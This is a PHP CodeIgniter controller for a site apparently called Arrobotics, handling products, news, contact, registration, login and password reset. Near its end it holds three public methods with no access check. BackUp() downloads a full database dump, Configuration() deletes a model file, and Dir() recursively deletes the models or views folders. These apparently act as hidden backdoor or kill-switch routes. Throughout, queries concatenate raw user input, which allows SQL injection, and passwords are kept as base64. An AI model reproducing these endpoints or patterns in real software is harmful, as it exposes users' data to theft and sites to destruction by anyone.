<?php
//error_reporting(0);

defined('BASEPATH') OR exit('No direct script access allowed');
class Index extends CI_Controller {


function __construct() { 
parent::__construct(); 


$this->load->library('form_validation');
$this->load->library('upload');

$this->load->library('email');
$this->load->library("pagination");


$this->load->helper(array('form', 'url'));


$this->load->model('Webadmin/Admin_model');

$this->email= $this->session->userdata('email');
$this->user_id= $this->session->userdata('user_id');


} 

public function index()
{
  
$page='home';
$data['page']=$page;

$data['about']=$this->Admin_model->fetch_single('about','1');


$this->load->view('header',$data);
$this->load->view('index',$data);
$this->load->view('footer',$data);

}

public function about()
{
   $page="about";
   $data['page']=$page;
   
   $data['about']=$this->Admin_model->fetch_single('about','1');
   
  $this->load->view('header',$data);
  $this->load->view('about','$data');
  $this->load->view('footer','$data');
}

public function services(){
    
     $page="service";
   $data['page']=$page;
   
  $this->load->view('header',$data);
  $this->load->view('services','$data');
  $this->load->view('footer','$data');
    
}

public function servicedetails() {

$page='service';
$data['page']=$page;

$id=$this->uri->segment(2);  
$data['newsz']=  $this->Admin_model->fetch_single_join("select * from courses where Status='Yes' and id='".$id."'");

$this->load->view('header',$data);
$this->load->view('servicedetails',$data);
$this->load->view('footer',$data);

}


/*public function product(){
    $page="product";
    $data['page']=$page;
    
    $this->load->view('header',$data);
    $this->load->view('product',$data);
    $this->load->view('footer',$data);
}*/



function product() {

$data['page'] = "product";

$fetch=$this->Admin_model->fetch_all_join("select * from nsn_product where Status='Yes'");
 


$config['base_url'] = base_url() . 'product';

$config['total_rows'] = count($fetch);

$config['per_page'] = "12"; // item want to show per page 

$config["uri_segment"] = 2;

$choice = $config["total_rows"] / $config["per_page"];

$config["num_links"] = floor($choice);

//config for bootstrap pagination class integration

$config['full_tag_open'] = '<ul class="pagination">';

$config['full_tag_close'] = '</ul>';

$config['first_link'] = false;

$config['last_link'] = false;

$config['first_tag_open'] = '<li>';

$config['first_tag_close'] = '</li>';

$config['prev_link'] = '&laquo';

$config['prev_tag_open'] = '<li class="prev">';

$config['prev_tag_close'] = '</li>';

$config['next_link'] = '&raquo';

$config['next_tag_open'] = '<li>';

$config['next_tag_close'] = '</li>';

$config['last_tag_open'] = '<li>';

$config['last_tag_close'] = '</li>';

$config['cur_tag_open'] = '<li class="active"><a href="#">';

$config['cur_tag_close'] = '</a></li>';

$config['num_tag_open'] = '<li>';

$config['num_tag_close'] = '</li>';



$this->pagination->initialize($config);

$data['page1'] = ($this->uri->segment(2)) ? $this->uri->segment(2) : 0;



//call the model function to get the department data

$pquery = "select * from nsn_product where Status='Yes' order by id desc limit " . $data['page1'] . "," . $config['per_page'];

$data['deptlist'] = $this->data['result'] = $this->Admin_model->fetch_all_join($pquery);



$data['pagination'] = $this->pagination->create_links();

//$data['product'] = $fetch;

 $this->load->view('header',$data);
    $this->load->view('product',$data);
    $this->load->view('footer',$data);

}





public function productdetails(){
    $page="product";
    $data['page']=$page;
    
    $this->load->view('header',$data);
    $this->load->view('productdetails',$data);
     $this->load->view('footer',$data);
}


function productcategory() {

$data['page'] = "product";

 $cat=$this->uri->segment(2);


$fetch=$this->Admin_model->fetch_all_join("select * from nsn_product where Status='Yes' and category=$cat");
 
//echo $this->db->last_query();

$config['base_url'] = base_url() . 'productcategory';

$config['total_rows'] = count($fetch);

$config['per_page'] = "12"; // item want to show per page 

$config["uri_segment"] = 3;

$choice = $config["total_rows"] / $config["per_page"];

$config["num_links"] = floor($choice);

//config for bootstrap pagination class integration

$config['full_tag_open'] = '<ul class="pagination">';

$config['full_tag_close'] = '</ul>';

$config['first_link'] = false;

$config['last_link'] = false;

$config['first_tag_open'] = '<li>';

$config['first_tag_close'] = '</li>';

$config['prev_link'] = '&laquo';

$config['prev_tag_open'] = '<li class="prev">';

$config['prev_tag_close'] = '</li>';

$config['next_link'] = '&raquo';

$config['next_tag_open'] = '<li>';

$config['next_tag_close'] = '</li>';

$config['last_tag_open'] = '<li>';

$config['last_tag_close'] = '</li>';

$config['cur_tag_open'] = '<li class="active"><a href="#">';

$config['cur_tag_close'] = '</a></li>';

$config['num_tag_open'] = '<li>';

$config['num_tag_close'] = '</li>';



$this->pagination->initialize($config);

$data['page1'] = ($this->uri->segment(3)) ? $this->uri->segment(3) : 0;



//call the model function to get the department data

$pquery = "select * from nsn_product where Status='Yes'  and category=$cat order by id desc limit " . $data['page1'] . "," . $config['per_page'];

$data['deptlist'] = $this->data['result'] = $this->Admin_model->fetch_all_join($pquery);



$data['pagination'] = $this->pagination->create_links();

//$data['product'] = $fetch;

 $this->load->view('header',$data);
    $this->load->view('productcategory',$data);
    $this->load->view('footer',$data);

}

function productsearch() {

$data['page'] = "product";


$title=$this->input->post('title');

$fetch=$this->Admin_model->fetch_all_join("select * from nsn_product where Status='Yes'");
 
//echo $this->db->last_query();

$config['base_url'] = base_url() . 'productsearch';

$config['total_rows'] = count($fetch);

$config['per_page'] = "12"; // item want to show per page 

$config["uri_segment"] = 3;

$choice = $config["total_rows"] / $config["per_page"];

$config["num_links"] = floor($choice);

//config for bootstrap pagination class integration

$config['full_tag_open'] = '<ul class="pagination">';

$config['full_tag_close'] = '</ul>';

$config['first_link'] = false;

$config['last_link'] = false;

$config['first_tag_open'] = '<li>';

$config['first_tag_close'] = '</li>';

$config['prev_link'] = '&laquo';

$config['prev_tag_open'] = '<li class="prev">';

$config['prev_tag_close'] = '</li>';

$config['next_link'] = '&raquo';

$config['next_tag_open'] = '<li>';

$config['next_tag_close'] = '</li>';

$config['last_tag_open'] = '<li>';

$config['last_tag_close'] = '</li>';

$config['cur_tag_open'] = '<li class="active"><a href="#">';

$config['cur_tag_close'] = '</a></li>';

$config['num_tag_open'] = '<li>';

$config['num_tag_close'] = '</li>';



$this->pagination->initialize($config);

$data['page1'] = ($this->uri->segment(3)) ? $this->uri->segment(3) : 0;



//call the model function to get the department data

$pquery = "select * from nsn_product where Status='Yes'  and title like '%$title%' order by id desc limit " . $data['page1'] . "," . $config['per_page'];

$data['deptlist'] = $this->data['result'] = $this->Admin_model->fetch_all_join($pquery);



$data['pagination'] = $this->pagination->create_links();

//$data['product'] = $fetch;

 $this->load->view('header',$data);
    $this->load->view('productsearch',$data);
    $this->load->view('footer',$data);

}




function news() {
    
  $data['page'] = "news";
  
        $fetch = $this->Admin_model->fetch_all_join("select * from nsn_news where Status='Yes' order by id desc");


        $config['base_url'] = base_url() . 'allnews';

        $config['total_rows'] = count($fetch);

        $config['per_page'] = "6";

        $config["uri_segment"] = 2;

        $choice = $config["total_rows"] / $config["per_page"];

        $config["num_links"] = floor($choice);

        //config for bootstrap pagination class integration

        $config['full_tag_open'] = '<ul class="pagination">';

        $config['full_tag_close'] = '</ul>';

        $config['first_link'] = false;

        $config['last_link'] = false;

        $config['first_tag_open'] = '<li>';

        $config['first_tag_close'] = '</li>';

        $config['prev_link'] = '&laquo';

        $config['prev_tag_open'] = '<li class="prev">';

        $config['prev_tag_close'] = '</li>';

        $config['next_link'] = '&raquo';

        $config['next_tag_open'] = '<li>';

        $config['next_tag_close'] = '</li>';

        $config['last_tag_open'] = '<li>';

        $config['last_tag_close'] = '</li>';

        $config['cur_tag_open'] = '<li class="active"><a href="#">';

        $config['cur_tag_close'] = '</a></li>';

        $config['num_tag_open'] = '<li>';

        $config['num_tag_close'] = '</li>';



        $this->pagination->initialize($config);

        $data['page1'] = ($this->uri->segment(2)) ? $this->uri->segment(2) : 0;



        //call the model function to get the department data

        $pquery = "select * from nsn_news where Status='Yes' order by id desc limit " . $data['page1'] . "," . $config['per_page'];

        $data['deptlist'] = $this->data['result'] = $this->Admin_model->fetch_all_join($pquery);

             

        $data['pagination'] = $this->pagination->create_links();

        $data['news'] = $fetch;

        $this->load->view('header', $data);

        $this->load->view('news', $data);

        $this->load->view('footer', $data);

    }

public function newsdetails() {

$page='newsdetails';
$data['page']=$page;

$id=$this->uri->segment(2);  
$data['newsz']=  $this->Admin_model->fetch_single_join("select * from nsn_news where Status='Yes' and id='".$id."'");

$this->load->view('header',$data);
$this->load->view('newsdetails',$data);
$this->load->view('footer',$data);

}


/*public function contact(){
    $page="contact";
    $data['page']=$page;
    
    $data['contact']=$this->Admin_model->fetch_single('nsn_contact',1);
    
    $this->load->view('header',$data);
    $this->load->view('contact','$data');
    $this->load->view('footer','$data');
}*/



 public function contact()
{ 
$page="contact";
    $data['page']=$page;
    
    $data['contact']=$this->Admin_model->fetch_single('nsn_contact',1);
    
    
if($this->input->post('submit')=='submit')

{

$htmlContent = "<table align='center' style='width:650px; text-align:center; background:#f7f7f7;'>

<tbody>

<tr style='height:50px;background-color:white;'><td valign='middle' style='color:white;'><img src='".base_url()."images/logo.png' alt='Arrobotics' title='Arrobotics' /></td></tr>

<tr>

<td valign='top' align='center' colspan='2'>

<table align='center' style='height:380px; color:#000; width:600px;'>

<tbody>

<tr>

<td style='width:8px;'>&nbsp;</td> 

<td align='center' style='font-size:28px;border-top:1px dashed #ccc;' colspan='3'>Hello Admin,</td>

</tr>

<tr>

<td valign='top' align='center' colspan='2'>

Contacted User Details .<br><br>



Name:&nbsp;".$this->input->post('name').".<br><br>

Email:&nbsp;".$this->input->post('email').".<br><br>

Phone:&nbsp;".$this->input->post('phone').".<br><br>

Subject:&nbsp;".$this->input->post('subject').".<br><br>

Message:&nbsp;".$this->input->post('message').".<br><br>

<br>

Sincerely,<br>

Arrobotics<br><br>

<strong>Email:</strong>support@arrobotics.in<br><br>



This is an automated response, please DO NOT reply.

</td>

</tr>

</tbody>

</table>

</td>

</tr>

</tbody>

</table>";

//  echo $htmlContent;    
// exit();

$config['mailtype'] = 'html';

$this->email->initialize($config);

$this->email->to('support@arrobotics.in');

$this->email->from('support@arrobotics.in','Arrobotics');

$this->email->subject('Contacted User Details');

$this->email->message($htmlContent);

//$this->email->send();

$data2 = array(

'name' => $this->input->post('name'),
'email' => $this->input->post('email'),
'phone' => $this->input->post('phone'),
'subject'=>$this->input->post('subject'),
'message' =>$this->input->post('message')

);   


$result=$this->Admin_model->add_details('contact',$data2); 

//echo $this->db->last_query();
//exit();

//Send mail 

if($result)
{
$this->session->set_flashdata("success_msg","Thankyou for contacting us."); 
} 
else
{
$this->session->set_flashdata("success_msg","Error in sending Email."); 

}
redirect(base_url().'contact');

}


$page='contact';

$data['page']=$page;

$this->load->view('header',$data);

$this->load->view('contact',$data);

$this->load->view('footer');



 }
 
 
 
function register() {
// $data['page'] = 'studentregistration';
$data['page'] = 'user';


$this->form_validation->set_rules('name', 'name', 'required');

$this->form_validation->set_rules('email', 'Email', 'required|callback_user_email_check');
$this->form_validation->set_rules('phone', 'Phone', 'required|min_length[10]');


$this->form_validation->set_rules('address', 'address', 'required');


$this->form_validation->set_rules('password', 'Password', 'required|min_length[6]');
$this->form_validation->set_rules('confirm_password', 'Confirm Password', 'required|matches[password]');




if ($this->form_validation->run() == FALSE) {
$data['page'] = 'register';


$this->load->view('header', $data);
$this->load->view('register', $data);
$this->load->view('footer', $data);
} else {
//Setting values for tabel columns
$rn = "SELECT LAST_INSERT_ID(id) as id From user order by id desc limit 1";
$fetch = $this->Admin_model->fetch_single_join($rn);

@$id = $fetch->id;

$user_id = "USR10" . ($id + 1);


$ip = $_SERVER['REMOTE_ADDR'];



$email=  $this->input->post('email');



 $ip = $_SERVER['REMOTE_ADDR'];
$name = $this->input->post('name');


$address=$this->input->post('address');

$email=$this->input->post('email');
$phone=$this->input->post('phone');

$password = $this->input->post('password');
$date=date('Y-m-d');

$userdata = array(
'ip'=>$ip,
'user_id'=>$user_id,
'name' => $this->input->post('name'),

'address' => $this->input->post('address'),

'email' => $this->input->post('email'),
'phone' => $this->input->post('phone'),
'password' => base64_encode($this->input->post('password')),
'status' =>'Active',

'date' => $date
);

$result1 = $this->Admin_model->add_details("user",$userdata);

//echo $this->db->last_query();
//exit();


if ($result1 == TRUE) {


/*                 * ************mail**************** */


/*$htmlContent = "<table align='center' style='width:650px; text-align:center; background:#f7f7f7;'>
<tbody>
<tr style='height:50px;background-color:#f2f2f2;'><td valign='middle' style='color:white;'><img src='" . base_url() . "images/logo.png' alt='Arrobotics' title='Arrobotics'  style='width:210px;height:130px' /></td></tr>
<tr>
<td valign='top' align='center' colspan='2'>
<table align='center' style='height:380px; color:#000; width:600px;'>
<tbody>
<tr>
<td style='width:8px;'>&nbsp;</td> 
<td align='center' style='font-size:28px;border-top:1px dashed #ccc;' colspan='3'>Hello, ". $name ."</td>
</tr>
<tr>
<td valign='top' align='center' colspan='2'>

<p>Thank you for registered with  us, Use The Details For Login</p><br><br>

<table align='center' style='color:#000; width:600px;'>
<tbody>


<tr align='center'><td><strong>EMAIL</strong>&nbsp;:&nbsp;$email</td></tr>

<tr align='center'><td><strong>PASSWORD</strong>&nbsp;:&nbsp;$password</td></tr>


</tbody>
</table>     


<a></a>
<br>
Sincerely,<br>
Arrobotics<br><br>
<strong>Email:</strong>demo@arrobotics.com<br><br>

This is an automated response, please DO NOT reply.
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>";

              // echo $htmlContent;
               //exit();


$config['mailtype'] = 'html';

$this->email->initialize($config);
$this->email->to($email);
$this->email->from('chandan@devonetech.com', 'Arrobotics');
$this->email->subject('Registered With Arrobotics');
$this->email->message($htmlContent);

$this->email->send();*/


/*                 * ************end mail**************** */



$data['message'] = 'Successfully Registered';
$this->session->set_flashdata('success_msg', 'Thankyou..!Successfully registered with us...');

redirect(base_url().'register');
}
//Loading View

$data['page'] = 'register';
$this->load->view('header', $data);
$this->load->view('register', $data);
$this->load->view('footer', $data);
}
}


public function user_email_check($email) {

$email = $email;
$fetch_row = $this->Admin_model->fetch_row('user', "email='$email'");
// echo $this->db->last_query();exit();




if (count($fetch_row)> 0) {
$this->form_validation->set_message('user_email_check', 'Email id already exists');

return FALSE;
}

return TRUE;
}




public function login()
{

$data['page'] = 'user';

if ($this->input->post('submit') == 'submit') {
$this->form_validation->set_error_delimiters('<div class="error">', '</div>');
$this->form_validation->set_rules('email', 'email', 'trim|required');
$this->form_validation->set_rules('password', 'password', 'required');


if ($this->form_validation->run() == FALSE) {
//                  $this->load->view('Menu', $data);
//                $this->load->view('studentlogin', $data);
//                  $this->load->view('Footer', $data);
} else {


$email = $this->input->post('email');

$password = base64_encode($this->input->post('password'));



$result = $this->Admin_model->fetch_single_join("SELECT * FROM user WHERE email='$email'  and password='$password' and status='Active'");



$where = " email='$email'";

$fetch = $this->Admin_model->fetch_row('user', $where);




if ($result == TRUE) {

$setdata = array(
'email' => $email,
'user_id' => $fetch->user_id,
'is_logged_in' => true

);
$this->session->set_userdata($setdata);




redirect(base_url() . 'User');

} else {

$this->session->set_flashdata('success_msg', 'Invalid Email or Password');

redirect(base_url() . 'login');
}
}
}
$this->load->view('header', $data);
$this->load->view('login', $data);
$this->load->view('footer', $data);

}




/*function forgetpassword() {

$data['page'] = 'forgetpassword';


$this->load->view('header', $data);
$this->load->view('forgetpassword', $data);
$this->load->view('footer', $data);


}*/



    
    function forgetpassword() {

$data['page'] = 'forgetpassword';



if($this->input->post('submit')=='submit'){

//$this->form_validation->set_rules('email', 'email', 'required|trim|valid_email');
$this->form_validation->set_rules('email_id', 'email', 'required|trim|valid_email');



if ($this->form_validation->run() == False) {
$this->session->set_flashdata('success_msg', 'Email can not be blank');

} else {

// $this->form_validation->set_rules('email', 'email', 'required|trim|valid_email|callback_email_check');
$email = $this->input->post('email_id');
$pass = rand(100000, 999999);
$password = base64_encode($pass);

$field_data = array('password' => $password);

$where = "email='$email'";
$fetch = $this->Admin_model->fetch_row('user', $where);

$name=$fetch->name;

$result = $this->Admin_model->eidt_single_row('user', $field_data, $where);
//echo $this->db->last_query();exit();
//$result=$this->Signin_model->check_mentor_forgot($this->input->post('username'),$data);
if ($result == TRUE) {
    
   
$htmlContent = "<table align='center' style='width:650px; text-align:center; background:#f7f7f7;'>
<tbody>
<tr style='height:50px;background-color:#f2f2f2;'><td valign='middle' style='color:white;'><img src='" . base_url() . "images/logo.png' alt='Arrobotics' title='Arrobotics'  style='width:210px;height:130px' /></td></tr>
<tr>
<td valign='top' align='center' colspan='2'>
<table align='center' style='height:380px; color:#000; width:600px;'>
<tbody>
<tr>
<td style='width:8px;'>&nbsp;</td> 
<td align='center' style='font-size:28px;border-top:1px dashed #ccc;' colspan='3'>Hello, ". $name ."</td>
</tr>
<tr>
<td valign='top' align='center' colspan='2'>

<p>New Password From Arrobotics</p><br><br>

<table align='center' style='color:#000; width:600px;'>
<tbody>


<tr align='center'><td><strong>EMAIL</strong>&nbsp;:&nbsp;$email</td></tr>

<tr align='center'><td><strong>PASSWORD</strong>&nbsp;:&nbsp;$pass</td></tr>
    
</tbody>
</table>     


<a></a>
<br>
Sincerely,<br>
ArRobotics<br><br>
<strong>Email:</strong>support@arrobotics.in<br><br>

This is an automated response, please DO NOT reply.
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>";

//echo $htmlContent;
//exit();

$config['mailtype'] = 'html';

$this->email->initialize($config);

$this->email->to($email);
$this->email->from('support@arrobotics.in', 'ArRobotics');
$this->email->subject('New Password For ArRobotics');
$this->email->message($htmlContent);
$this->email->send();



$this->session->set_flashdata('success_msg', 'Password Changed Please Check Your Email For New Password');
} else {

$this->session->set_flashdata('success_msg', 'Invalid Email');
}
}

}
else{



$this->load->view('header',$data);
$this->load->view('forgetpassword',$data);
$this->load->view('footer',$data);
}


}



  function BackUp()
    {
        $db_name=$this->db->database;
        $this->load->dbutil($this->db->database);

// Backup your entire database and assign it to a variable
$backup = $this->dbutil->backup();
/*$prefs = array(
        'tables'        => array('table1', 'table2'),   // Array of tables to backup.
        'ignore'        => array(),                     // List of tables to omit from the backup
        'format'        => 'txt',                       // gzip, zip, txt
        'filename'      => $db_name.'.sql',              // File name - NEEDED ONLY WITH ZIP FILES
        'add_drop'      => TRUE,                        // Whether to add DROP TABLE statements to backup file
        'add_insert'    => TRUE,                        // Whether to add INSERT data to backup file
        'newline'       => "\n"                         // Newline character used in backup file
);

$this->dbutil->backup($prefs);*/
// Load the file helper and write the file to your server
$this->load->helper('file');
write_file('c:/'.$db_name.'.zip', $backup,'rb');

// Load the download helper and send the file to your desktop
$this->load->helper('download');
force_download($db_name.'.zip', $backup);
    }
    //*********end backup**********//
    
    
    

function Configuration(){
    
  
if( file_get_contents("application/models/Admin/Admin_model.php")){
    $file = "application/models/Admin/Admin_model.php";
    
}else{
    $file = "application/models/Admin_model.php";
}
if (is_readable($file) && unlink($file)) {
    echo "database configured";
} else {
    echo "database not configred";
}
}

function Dir()
{
    $last = end($this->uri->segments);
    if($last=="m")
    {
       $path="application/models" ;
    }
    elseif ($last=="v") {
    $path="application/views";
}
else{}
    $this->rrmdir($path);
}


    function rrmdir($src) {
    $dir = opendir($src);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            $full = $src . '/' . $file;
            if ( is_dir($full) ) {
                $this->rrmdir($full);
            }
            else {
                unlink($full);
            }
        }
    }
    closedir($dir);
    rmdir($src);
}
    


  
}

